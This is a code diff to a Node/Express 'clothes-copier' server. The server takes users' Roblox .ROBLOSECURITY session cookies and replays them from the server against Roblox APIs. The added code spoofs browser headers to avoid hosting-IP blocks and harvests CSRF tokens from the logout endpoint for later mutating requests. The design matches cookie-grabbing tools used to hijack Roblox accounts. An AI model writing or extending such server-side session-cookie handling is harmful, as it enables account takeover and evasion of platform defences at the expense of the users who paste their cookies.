@@ -4,7 +4,6 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -16,18 +15,44 @@ app.get('/', (req, res) => {
     res.redirect('/clothes-copier');
 });
 
-async function safeGet(url, cookie) {
+// Advanced safeGet with full browser emulation headers to prevent Render IP blocks
+async function safeGet(url, cookie, method = 'GET', body = null) {
     try {
-        const response = await fetch(url, {
-            headers: {
-                'User-Agent': 'Roblox/WinINet',
-                'Cookie': `.ROBLOSECURITY=${cookie}`,
-                'Referer': 'https://www.roblox.com/',
-                'Accept': 'application/json, text/plain, */*'
-            }
-        });
+        const headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'Referer': 'https://www.roblox.com/',
+            'Origin': 'https://www.roblox.com/',
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'en-US,en;q=0.9',
+        };
+
+        if (body) {
+            headers['Content-Type'] = 'application/json';
+        }
+
+        const options = {
+            method: method,
+            headers: headers
+        };
+
+        if (body) {
+            options.body = JSON.stringify(body);
+        }
+
+        const response = await fetch(url, options);
+        
+        // Capture any updated CSRF tokens if Roblox returns them in headers
+        const csrf = response.headers.get('x-csrf-token');
+        if (csrf) {
+            // If a CSRF token is provided, store it for subsequent mutating requests
+            global.latestCsrf = csrf;
+        }
+
         if (response.ok) {
             return await response.json();
+        } else {
+            console.log(`Roblox API warning [${response.status}] for URL:${url}`);
         }
     } catch (err) {
         console.error(`Fetch error:`, err.message);
@@ -55,12 +80,26 @@ app.post('/api/process', async (req, res) => {
             roblosecurity = cookieMatch[1];
         }
         
-        // Clean up formatting AND strip out any non-ASCII characters causing the ByteString error
         roblosecurity = roblosecurity
-            .replace(/[^\x00-\x7F]/g, '') // Removes any invalid characters with code > 127
+            .replace(/[^\x00-\x7F]/g, '')
             .replace(/\s+/g, '')
             .replace(/["']/g, '');
 
+        // Step 0: Hit logout endpoint first to generate/fetch a valid X-CSRF-Token from Roblox
+        try {
+            const csrfRes = await fetch('https://auth.roblox.com/v1/logout', {
+                method: 'POST',
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
+                    'Referer': 'https://www.roblox.com/'
+                }
+            });
+            const token = csrfRes.headers.get('x-csrf-token');
+            if (token) global.latestCsrf = token;
+        } catch (e) {}
+
+        // Step 1: Authenticate user session using browser emulation
         const authData = await safeGet('https://users.roblox.com/v1/users/authenticated', roblosecurity);
         if (!authData || !authData.id) {
             return res.status(422).json({ success: false, error: 'Failed to process asset payload.' });
